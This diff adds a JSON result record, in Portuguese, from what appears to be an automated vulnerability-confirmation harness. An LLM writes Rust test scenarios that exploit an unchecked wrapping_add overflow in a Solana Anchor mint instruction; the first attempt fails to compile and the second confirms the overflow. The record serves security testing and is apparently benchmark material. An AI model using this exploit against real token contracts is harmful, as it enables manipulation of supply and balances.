@@ -1,0 +1,92 @@
+{
+  "category": "MATH",
+  "verdict": "confirmed",
+  "exploit_successful": true,
+  "attack_result": "Success",
+  "reason": "ataque aceito e efeitos verificados: total_supply deu a volta (49) e user_balance = u64::MAX - 50, confirmando overflow silencioso",
+  "attempts_used": 2,
+  "attempts": [
+    {
+      "attempt": 1,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 2081,
+        "completion_tokens": 888,
+        "latency_s": 4.64
+      },
+      "raw": "{\n  \"plan\": \"Inicializamos o ledger com total_supply = 100 e user_balance = 0 via a instrucao initialize (baseline). Em seguida, chamamos mint com amount = u64::MAX - 50, que somado ao total_supply atual (100) ultrapassa u64::MAX e faz wrapping_add dar a volta. O efeito medido e que total_supply e user_balance resultam em valores pequenos (49 e u64::MAX - 50, respectivamente) em vez de a instrucao falhar, confirmando o overflow silencioso.\",\n  \"scenario\": \"let authority = Pubkey::new_unique();\\nlet ledger_key = Pubkey::new_unique();\\n\\n// Conta ledger vazia para init\\nlet ledger_empty = empty_account();\\nlet authority_wallet = wallet(10_000_000_000);\\nlet (system_id, system_acc) = system_program_account();\\n\\n// Baseline: initialize com initial_supply = 100\\nlet ix_init = env.anchor_ix(\\n    \\\"initialize\\\",\\n    &(100u64,),\\n    vec![\\n        AccountMeta::new(ledger_key, true),\\n        AccountMeta::new(authority, true),\\n        AccountMeta::new_readonly(system_id, false),\\n    ],\\n);\\nlet contas_init = vec![\\n    (ledger_key, ledger_empty),\\n    (authority, authority_wallet),\\n    (system_id, system_acc),\\n];\\nlet r_init = env.baseline(\\\"initialize ledger com 100\\\", &ix_init, &contas_init);\\n\\n// Extrai a conta ledger resultante do baseline\\nlet ledger_after_init = r_init\\n    .resulting_accounts\\n    .iter()\\n    .find(|(k, _)| *k == ledger_key)\\n    .map(|(_, a)| a.clone())\\n    .unwrap_or_else(|| account(&env.program_id, &anchor_account_data(\\\"Ledger\\\", &(authority, 100u64, 0u64)), None));\\n\\n// Ataque: mint com amount = u64::MAX - 50 (100 + (u64::MAX - 50) > u64::MAX)\\nlet amount_ataque = u64::MAX - 50;\\nlet ix_mint = env.anchor_ix(\\n    \\\"mint\\\",\\n    &(amount_ataque,),\\n    vec![\\n        AccountMeta::new(ledger_key, false),\\n        AccountMeta::new_readonly(authority, true),\\n    ],\\n);\\nlet contas_mint = vec![\\n    (ledger_key, ledger_after_init),\\n    (authority, wallet(1_000_000)),\\n];\\nlet r_ataque = env.attack(\\\"mint com amount que causa overflow\\\", &ix_mint, &contas_mint);\\n\\nif r_ataque.program_result == ProgramResult::Success {\\n    let ledger_final = after(&r_ataque, &ledger_key);\\n    let total_supply_final = read_u64(ledger_final.data(), 40);\\n    let user_balance_final = read_u64(ledger_final.data(), 48);\\n    // Esperado se wrapping: total_supply = 100 + (u64::MAX - 50) mod 2^64 = 49\\n    // user_balance = 0 + (u64::MAX - 50) = u64::MAX - 50\\n    env.effect(\\n        \\\"total_supply deu a volta (49) e user_balance = u64::MAX - 50, confirmando overflow silencioso\\\",\\n        total_supply_final == 49u64 && user_balance_final == amount_ataque,\\n    );\\n}\"\n}",
+      "plan": "Inicializamos o ledger com total_supply = 100 e user_balance = 0 via a instrucao initialize (baseline). Em seguida, chamamos mint com amount = u64::MAX - 50, que somado ao total_supply atual (100) ultrapassa u64::MAX e faz wrapping_add dar a volta. O efeito medido e que total_supply e user_balance resultam em valores pequenos (49 e u64::MAX - 50, respectivamente) em vez de a instrucao falhar, confirmando o overflow silencioso.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet ledger_key = Pubkey::new_unique();\n\n// Conta ledger vazia para init\nlet ledger_empty = empty_account();\nlet authority_wallet = wallet(10_000_000_000);\nlet (system_id, system_acc) = system_program_account();\n\n// Baseline: initialize com initial_supply = 100\nlet ix_init = env.anchor_ix(\n    \"initialize\",\n    &(100u64,),\n    vec![\n        AccountMeta::new(ledger_key, true),\n        AccountMeta::new(authority, true),\n        AccountMeta::new_readonly(system_id, false),\n    ],\n);\nlet contas_init = vec![\n    (ledger_key, ledger_empty),\n    (authority, authority_wallet),\n    (system_id, system_acc),\n];\nlet r_init = env.baseline(\"initialize ledger com 100\", &ix_init, &contas_init);\n\n// Extrai a conta ledger resultante do baseline\nlet ledger_after_init = r_init\n    .resulting_accounts\n    .iter()\n    .find(|(k, _)| *k == ledger_key)\n    .map(|(_, a)| a.clone())\n    .unwrap_or_else(|| account(&env.program_id, &anchor_account_data(\"Ledger\", &(authority, 100u64, 0u64)), None));\n\n// Ataque: mint com amount = u64::MAX - 50 (100 + (u64::MAX - 50) > u64::MAX)\nlet amount_ataque = u64::MAX - 50;\nlet ix_mint = env.anchor_ix(\n    \"mint\",\n    &(amount_ataque,),\n    vec![\n        AccountMeta::new(ledger_key, false),\n        AccountMeta::new_readonly(authority, true),\n    ],\n);\nlet contas_mint = vec![\n    (ledger_key, ledger_after_init),\n    (authority, wallet(1_000_000)),\n];\nlet r_ataque = env.attack(\"mint com amount que causa overflow\", &ix_mint, &contas_mint);\n\nif r_ataque.program_result == ProgramResult::Success {\n    let ledger_final = after(&r_ataque, &ledger_key);\n    let total_supply_final = read_u64(ledger_final.data(), 40);\n    let user_balance_final = read_u64(ledger_final.data(), 48);\n    // Esperado se wrapping: total_supply = 100 + (u64::MAX - 50) mod 2^64 = 49\n    // user_balance = 0 + (u64::MAX - 50) = u64::MAX - 50\n    env.effect(\n        \"total_supply deu a volta (49) e user_balance = u64::MAX - 50, confirmando overflow silencioso\",\n        total_supply_final == 49u64 && user_balance_final == amount_ataque,\n    );\n}",
+      "run": {
+        "kind": "compile_error",
+        "events": [],
+        "detail": "error[E0308]: mismatched types\n  --> tests/attempt.rs:20:9\n   |\n18 |     let ix_init = env.anchor_ix(\n   |                       --------- arguments to this method are incorrect\n19 |         \"initialize\",\n20 |         &(100u64,),\n   |         ^^^^^^^^^^ expected `&[u8]`, found `&(u64,)`\n   |\n   = note: expected reference `&[u8]`\n              found reference `&(u64,)`\nnote: method defined here\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:40:84\n    |\n 40 | ..., &anchor_account_data(\"Ledger\", &(authority, 100u64, 0u64)), None));\n    |       -------------------           ^^^^^^^^^^^^^^^^^^^^^^^^^^ expected `&[u8]`, found `&(Pubkey, u64, u64)`\n    |       |\n    |       arguments to this function are incorrect\n    |\n    = note: expected reference `&[u8]`\n               found reference `&(dynamic_harness::Pubkey, u64, u64)`\nnote: function defined here\n   --> src/lib.rs:186:8\nerror[E0308]: mismatched types\n  --> tests/attempt.rs:46:9\n   |\n44 |     let ix_mint = env.anchor_ix(\n   |                       --------- arguments to this method are incorrect\n45 |         \"mint\",\n46 |         &(amount_ataque,),\n   |         ^^^^^^^^^^^^^^^^^ expected `&[u8]`, found `&(u64,)`\n   |\n   = note: expected reference `&[u8]`\n              found reference `&(u64,)`\nnote: method defined here\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 3 previous errors",
+        "elapsed_s": 0.7
+      },
+      "verdict": null,
+      "reason": "erro de compilacao:\nerror[E0308]: mismatched types\n  --> tests/attempt.rs:20:9\n   |\n18 |     let ix_init = env.anchor_ix(\n   |                       --------- arguments to this method are incorrect\n19 |         \"initialize\",\n20 |         &(100u64,),\n   |         ^^^^^^^^^^ expected `&[u8]`, found `&(u64,)`\n   |\n   = note: expected reference `&[u8]`\n              found reference `&(u64,)`\nnote: method defined here\nerror[E0308]: mismatched types\n   --> tests/attempt.rs:40:84\n    |\n 40 | ..., &anchor_account_data(\"Ledger\", &(authority, 100u64, 0u64)), None));\n    |       -------------------           ^^^^^^^^^^^^^^^^^^^^^^^^^^ expected `&[u8]`, found `&(Pubkey, u64, u64)`\n    |       |\n    |       arguments to this function are incorrect\n    |\n    = note: expected reference `&[u8]`\n               found reference `&(dynamic_harness::Pubkey, u64, u64)`\nnote: function defined here\n   --> src/lib.rs:186:8\nerror[E0308]: mismatched types\n  --> tests/attempt.rs:46:9\n   |\n44 |     let ix_mint = env.anchor_ix(\n   |                       --------- arguments to this method are incorrect\n45 |         \"mint\",\n46 |         &(amount_ataque,),\n   |         ^^^^^^^^^^^^^^^^^ expected `&[u8]`, found `&(u64,)`\n   |\n   = note: expected reference `&[u8]`\n              found reference `&(u64,)`\nnote: method defined here\nerror: could not compile `dynamic-harness` (test \"attempt\") due to 3 previous errors"
+    },
+    {
+      "attempt": 2,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3220,
+        "completion_tokens": 988,
+        "latency_s": 4.11
+      },
+      "raw": "{\"plan\": \"Inicializo a conta Ledger via baseline `initialize` com total_supply=100 e user_balance=0, usando a authority como signer. Em seguida chamo `mint` com amount = u64::MAX - 50, que somado a 100 estoura u64. Se o programa usar wrapping_add, total_supply dara a volta para 49 e user_balance ficara em u64::MAX-50, confirmando o overflow silencioso. Os argumentos sao serializados manualmente em Borsh (u64 LE) e os dados da conta Ledger sao montados com discriminador + campos.\", \"scenario\": \"let authority = Pubkey::new_unique();\\nlet ledger_key = Pubkey::new_unique();\\n\\nlet ledger_empty = empty_account();\\nlet authority_wallet = wallet(10_000_000_000);\\nlet (system_id, system_acc) = system_program_account();\\n\\n// Baseline: initialize com initial_supply = 100\\nlet mut init_data = Vec::new();\\ninit_data.extend_from_slice(&100u64.to_le_bytes());\\nlet ix_init = env.anchor_ix(\\n    \\\"initialize\\\",\\n    &init_data,\\n    vec![\\n        AccountMeta::new(ledger_key, true),\\n        AccountMeta::new(authority, true),\\n        AccountMeta::new_readonly(system_id, false),\\n    ],\\n);\\nlet contas_init = vec![\\n    (ledger_key, ledger_empty),\\n    (authority, authority_wallet),\\n    (system_id, system_acc),\\n];\\nlet r_init = env.baseline(\\\"initialize ledger com 100\\\", &ix_init, &contas_init);\\n\\n// Extrai a conta ledger resultante do baseline\\nlet ledger_after_init = r_init\\n    .resulting_accounts\\n    .iter()\\n    .find(|(k, _)| *k == ledger_key)\\n    .map(|(_, a)| a.clone())\\n    .unwrap_or_else(|| {\\n        let mut d = anchor_account_discriminator(\\\"Ledger\\\").to_vec();\\n        d.extend_from_slice(authority.as_ref());\\n        d.extend_from_slice(&100u64.to_le_bytes());\\n        d.extend_from_slice(&0u64.to_le_bytes());\\n        account(&env.program_id, &d, None)\\n    });\\n\\n// Ataque: mint com amount = u64::MAX - 50 (100 + (u64::MAX - 50) > u64::MAX)\\nlet amount_ataque = u64::MAX - 50;\\nlet mut mint_data = Vec::new();\\nmint_data.extend_from_slice(&amount_ataque.to_le_bytes());\\nlet ix_mint = env.anchor_ix(\\n    \\\"mint\\\",\\n    &mint_data,\\n    vec![\\n        AccountMeta::new(ledger_key, false),\\n        AccountMeta::new_readonly(authority, true),\\n    ],\\n);\\nlet contas_mint = vec![\\n    (ledger_key, ledger_after_init),\\n    (authority, wallet(1_000_000)),\\n];\\nlet r_ataque = env.attack(\\\"mint com amount que causa overflow\\\", &ix_mint, &contas_mint);\\n\\nif r_ataque.program_result == ProgramResult::Success {\\n    let ledger_final = after(&r_ataque, &ledger_key);\\n    let total_supply_final = read_u64(ledger_final.data(), 40);\\n    let user_balance_final = read_u64(ledger_final.data(), 48);\\n    // Esperado se wrapping: total_supply = 100 + (u64::MAX - 50) mod 2^64 = 49\\n    // user_balance = 0 + (u64::MAX - 50) = u64::MAX - 50\\n    env.effect(\\n        \\\"total_supply deu a volta (49) e user_balance = u64::MAX - 50, confirmando overflow silencioso\\\",\\n        total_supply_final == 49u64 && user_balance_final == amount_ataque,\\n    );\\n}\"}",
+      "plan": "Inicializo a conta Ledger via baseline `initialize` com total_supply=100 e user_balance=0, usando a authority como signer. Em seguida chamo `mint` com amount = u64::MAX - 50, que somado a 100 estoura u64. Se o programa usar wrapping_add, total_supply dara a volta para 49 e user_balance ficara em u64::MAX-50, confirmando o overflow silencioso. Os argumentos sao serializados manualmente em Borsh (u64 LE) e os dados da conta Ledger sao montados com discriminador + campos.",
+      "scenario": "let authority = Pubkey::new_unique();\nlet ledger_key = Pubkey::new_unique();\n\nlet ledger_empty = empty_account();\nlet authority_wallet = wallet(10_000_000_000);\nlet (system_id, system_acc) = system_program_account();\n\n// Baseline: initialize com initial_supply = 100\nlet mut init_data = Vec::new();\ninit_data.extend_from_slice(&100u64.to_le_bytes());\nlet ix_init = env.anchor_ix(\n    \"initialize\",\n    &init_data,\n    vec![\n        AccountMeta::new(ledger_key, true),\n        AccountMeta::new(authority, true),\n        AccountMeta::new_readonly(system_id, false),\n    ],\n);\nlet contas_init = vec![\n    (ledger_key, ledger_empty),\n    (authority, authority_wallet),\n    (system_id, system_acc),\n];\nlet r_init = env.baseline(\"initialize ledger com 100\", &ix_init, &contas_init);\n\n// Extrai a conta ledger resultante do baseline\nlet ledger_after_init = r_init\n    .resulting_accounts\n    .iter()\n    .find(|(k, _)| *k == ledger_key)\n    .map(|(_, a)| a.clone())\n    .unwrap_or_else(|| {\n        let mut d = anchor_account_discriminator(\"Ledger\").to_vec();\n        d.extend_from_slice(authority.as_ref());\n        d.extend_from_slice(&100u64.to_le_bytes());\n        d.extend_from_slice(&0u64.to_le_bytes());\n        account(&env.program_id, &d, None)\n    });\n\n// Ataque: mint com amount = u64::MAX - 50 (100 + (u64::MAX - 50) > u64::MAX)\nlet amount_ataque = u64::MAX - 50;\nlet mut mint_data = Vec::new();\nmint_data.extend_from_slice(&amount_ataque.to_le_bytes());\nlet ix_mint = env.anchor_ix(\n    \"mint\",\n    &mint_data,\n    vec![\n        AccountMeta::new(ledger_key, false),\n        AccountMeta::new_readonly(authority, true),\n    ],\n);\nlet contas_mint = vec![\n    (ledger_key, ledger_after_init),\n    (authority, wallet(1_000_000)),\n];\nlet r_ataque = env.attack(\"mint com amount que causa overflow\", &ix_mint, &contas_mint);\n\nif r_ataque.program_result == ProgramResult::Success {\n    let ledger_final = after(&r_ataque, &ledger_key);\n    let total_supply_final = read_u64(ledger_final.data(), 40);\n    let user_balance_final = read_u64(ledger_final.data(), 48);\n    // Esperado se wrapping: total_supply = 100 + (u64::MAX - 50) mod 2^64 = 49\n    // user_balance = 0 + (u64::MAX - 50) = u64::MAX - 50\n    env.effect(\n        \"total_supply deu a volta (49) e user_balance = u64::MAX - 50, confirmando overflow silencioso\",\n        total_supply_final == 49u64 && user_balance_final == amount_ataque,\n    );\n}",
+      "run": {
+        "kind": "ran",
+        "events": [
+          {
+            "step": "setup",
+            "attacker_program": ""
+          },
+          {
+            "step": "baseline",
+            "note": "initialize ledger com 100",
+            "result": "Success",
+            "compute_units": 5815,
+            "account_flags": "sw,sw,-r"
+          },
+          {
+            "step": "attack",
+            "note": "mint com amount que causa overflow",
+            "result": "Success",
+            "compute_units": 2457,
+            "account_flags": "-w,sr"
+          },
+          {
+            "step": "effect",
+            "note": "total_supply deu a volta (49) e user_balance = u64::MAX - 50, confirmando overflow silencioso",
+            "holds": true
+          }
+        ],
+        "runtime_trace": [
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA invoke [1]",
+          "Program 11111111111111111111111111111111 invoke [2]",
+          "Program 11111111111111111111111111111111 success",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA consumed 5815 of 1400000 compute units",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA success",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA invoke [1]",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA consumed 2457 of 1400000 compute units",
+          "Program 3w5jyYEgbsnHjFcTUH9xdyH3KfN2YRppPCFUkskyYSxA success"
+        ],
+        "elapsed_s": 1.9
+      },
+      "verdict": "confirmed",
+      "reason": "ataque aceito e efeitos verificados: total_supply deu a volta (49) e user_balance = u64::MAX - 50, confirmando overflow silencioso"
+    }
+  ],
+  "case_id": "SSP-03-A-V1",
+  "static_finding": {
+    "category": "MATH",
+    "confidence": "high",
+    "evidence": "ledger.total_supply = ledger.total_supply.wrapping_add(amount);\nledger.user_balance = ledger.user_balance.wrapping_add(amount);",
+    "explanation": "A instrucao usa wrapping_add para atualizar total_supply e user_balance. wrapping_add descarta silenciosamente o overflow, fazendo os valores darem a volta (wrap around) em vez de falhar. Isso permite que um atacante cunhe uma quantidade que estoure u64 e reinicie os saldos para valores baixos, manipulando indevidamente os saldos. O enum ErrorCode define ArithmeticOverflow, mas ele nunca e usado, indicando que a checagem segura foi omitida.",
+    "attack_hypothesis": "Um atacante chama mint com amount proximo de u64::MAX (ou um valor que somado ao saldo atual ultrapasse u64::MAX). O wrapping_add faz total_supply e user_balance darem a volta para valores pequenos, permitindo manipular o suprimento e o saldo do usuario de forma indevida.",
+    "attack_hypothesis_note": ""
+  }
+}
